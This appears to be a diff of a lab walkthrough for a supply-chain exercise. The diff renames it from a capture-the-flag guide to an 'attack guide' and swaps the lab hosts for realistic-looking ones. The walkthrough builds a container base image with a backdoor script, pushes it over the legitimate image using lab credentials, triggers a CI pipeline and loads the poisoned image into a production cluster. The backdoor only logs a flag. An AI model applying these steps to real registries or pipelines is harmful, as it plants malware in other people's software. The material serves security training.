@@ -1,4 +1,4 @@
-# Challenge 3: Malware in Base Image Attack - CTF Guide
+# Challenge 3: Malware in Base Image Attack - Attack Guide
 
 ## Objective
 
@@ -10,7 +10,7 @@ Poison the base container image in the local registry to inject malware into pro
 
 ```
 1. Create malicious base image with backdoor
-2. Push poisoned image to registry (localhost:30000/golang:1.25-alpine)
+2. Push poisoned image to registry (registry.sc.local:30443/golang:1.25-alpine)
 3. Trigger legitimate build pipeline
 4. Pipeline pulls poisoned base image
 5. Malware embedded in recipe-api production image
@@ -49,7 +49,7 @@ FLAG="FLAG{b4s3_1m4g3_p01s0n1ng_supply_ch41n:NEXT:gitops_compromise}"
 # Create a hidden marker file
 echo "$FLAG" > /tmp/.malware_active
 
-# Simulate data exfiltration (in CTF, just log it)
+# Simulate data exfiltration (in the deep dive, just log it)
 echo "[MALWARE] Backdoor activated in production container!"
 echo "[MALWARE] Flag: $FLAG"
 echo "[MALWARE] Hostname: $(hostname)"
@@ -94,7 +94,7 @@ EOF
 ### 1.3 Build the Poisoned Image
 
 ```bash
-podman build -t localhost:30000/golang:1.25-alpine .
+podman build -t registry.sc.local:30443/golang:1.25-alpine .
 ```
 
 **Expected output:**
@@ -103,17 +103,17 @@ STEP 1/5: FROM golang:1.25-alpine
 STEP 2/5: COPY backdoor.sh /usr/local/bin/backdoor.sh
 STEP 3/5: RUN chmod +x /usr/local/bin/backdoor.sh
 ...
-Successfully tagged localhost:30000/golang:1.25-alpine:latest
+Successfully tagged registry.sc.local:30443/golang:1.25-alpine:latest
 ```
 
 ## Step 2: Push Poisoned Image to Registry
 
 ```bash
 # Login with stolen credentials from Challenge 1
-podman login localhost:30000 -u ctf-admin -p CTFRegistryPass123!
+podman login registry.sc.local:30443 -u sc-admin -p RegistryPass123!
 
 # Push the poisoned base image (overwrites legitimate image)
-podman push localhost:30000/golang:1.25-alpine
+podman push registry.sc.local:30443/golang:1.25-alpine
 ```
 
 **Expected output:**
@@ -128,8 +128,8 @@ Writing manifest to image destination
 
 ```bash
 # Verify the poisoned image is in the registry (expecting execution from the repo's root directory)
-curl --cacert setup/certs/registry.crt -u ctf-admin:CTFRegistryPass123! \
-  https://localhost:30000/v2/golang/tags/list
+curl --cacert setup/certs/registry.crt -u sc-admin:RegistryPass123! \
+  https://registry.sc.local:30443/v2/golang/tags/list
 
 # Should show: {"name":"golang","tags":["1.25-alpine"]}
 ```
@@ -143,7 +143,7 @@ Now wait for or trigger the victim's build pipeline:
 # Option 2: Manually trigger a build
 
 # Check for existing pipeline runs
-kubectl get pipelineruns -n ctf-challenge
+kubectl get pipelineruns -n ci
 
 # If needed, trigger manually (simulate git push)
 kubectl create -f - <<EOF
@@ -151,7 +151,7 @@ apiVersion: tekton.dev/v1
 kind: PipelineRun
 metadata:
   name: build-recipe-api-poisoned-$(date +%s)
-  namespace: ctf-challenge
+  namespace: ci
 spec:
   pipelineRef:
     name: build-push-pipeline
@@ -173,17 +173,17 @@ Watch the pipeline build the poisoned image:
 
 ```bash
 # Watch pipeline progress
-kubectl get pipelineruns -n ctf-challenge -w
+kubectl get pipelineruns -n ci -w
 
 # View detailed logs of the build task
-PIPELINE_RUN=$(kubectl get pipelineruns -n ctf-challenge --sort-by=.metadata.creationTimestamp -o name | tail -1)
-kubectl logs -n ctf-challenge $PIPELINE_RUN -c step-build-image -f
+PIPELINE_RUN=$(kubectl get pipelineruns -n ci --sort-by=.metadata.creationTimestamp -o name | tail -1)
+kubectl logs -n ci $PIPELINE_RUN -c step-build-image -f
 ```
 
 **Look for:**
-- Pipeline pulling `FROM localhost:30000/golang:1.25-alpine`
+- Pipeline pulling `FROM registry.sc.local:30443/golang:1.25-alpine`
 - Build completing successfully
-- Image pushed to registry as `localhost:30000/recipe-api:latest`
+- Image pushed to registry as `registry.sc.local:30443/recipe-api:latest`
 
 ## Step 5: Verify Malware in Production Image
 
@@ -191,14 +191,14 @@ kubectl logs -n ctf-challenge $PIPELINE_RUN -c step-build-image -f
 
 ```bash
 # Pull the newly built recipe-api image
-podman pull localhost:30000/recipe-api:latest
+podman pull registry.sc.local:30443/recipe-api:latest
 ```
 
 ### 5.2 Inspect Image Layers
 
 ```bash
 # Check if our malware files are present
-podman run --rm localhost:30000/recipe-api:latest ls -la /usr/local/bin/ | grep backdoor
+podman run --rm registry.sc.local:30443/recipe-api:latest ls -la /usr/local/bin/ | grep backdoor
 
 # Should show: -rwxr-xr-x    1 root     root   backdoor.sh
 ```
@@ -207,7 +207,7 @@ podman run --rm localhost:30000/recipe-api:latest ls -la /usr/local/bin/ | grep 
 
 ```bash
 # Run the poisoned container
-podman run --rm localhost:30000/recipe-api:latest cat /tmp/.malware_active
+podman run --rm registry.sc.local:30443/recipe-api:latest cat /tmp/.malware_active
 ```
 
 **Expected output (contains the flag):**
@@ -217,12 +217,12 @@ FLAG{b4s3_1m4g3_p01s0n1ng_supply_ch41n:NEXT:gitops_compromise}
 
 ## Step 6: Verify Malware Execution in Production
 
-At the moment, the recipe-api container images cannot be synched from the ctf-cluster kind cluster (and its internal registry) to the production ctf-production-cluster kind cluster.
+At the moment, the recipe-api container images cannot be synched from the ci-cluster kind cluster (and its internal registry) to the production production-cluster kind cluster.
 
 You can achieve that manually:
 ```
-podman save localhost:30000/recipe-api:v1.0 -o recipe-api.tar
-kind load image-archive recipe-api.tar --name ctf-production-cluster
+podman save registry.sc.local:30443/recipe-api:v1.0 -o recipe-api.tar
+kind load image-archive recipe-api.tar --name production-cluster
 ```
 
 If the recipe-api is deployed to the cluster:
@@ -261,12 +261,12 @@ Submit: `FLAG{b4s3_1m4g3_p01s0n1ng_supply_ch41n:NEXT:gitops_compromise}`
 
 Ensure you're using the credentials from Challenge 1:
 ```bash
-podman login localhost:30000 -u ctf-admin -p CTFRegistryPass123!
+podman login registry.sc.local:30443 -u sc-admin -p RegistryPass123!
 ```
 
 Check TLS configuration:
 ```bash
-ls -la /etc/containers/certs.d/localhost:30000/ca.crt
+ls -la /etc/containers/certs.d/registry.sc.local:30443/ca.crt
 ```
 </details>
 
@@ -280,7 +280,7 @@ podman images | grep golang.*1.25-alpine
 
 Check the Dockerfile in recipe-api:
 ```bash
-git clone http://localhost:30002/ctf-admin/recipe-api.git
+git clone http://gitea.sc.local:30080/sc-admin/recipe-api.git
 grep "FROM" recipe-api/Dockerfile
 ```
 </details>
@@ -290,12 +290,12 @@ grep "FROM" recipe-api/Dockerfile
 
 The flag is written by the backdoor script. Run the container and check:
 ```bash
-podman run --rm localhost:30000/recipe-api:latest cat /tmp/.malware_active
+podman run --rm registry.sc.local:30443/recipe-api:latest cat /tmp/.malware_active
 ```
 
 Or check the entrypoint execution:
 ```bash
-podman run --rm localhost:30000/recipe-api:latest sh -c '/usr/local/bin/backdoor.sh && cat /tmp/.malware_active'
+podman run --rm registry.sc.local:30443/recipe-api:latest sh -c '/usr/local/bin/backdoor.sh && cat /tmp/.malware_active'
 ```
 </details>
 
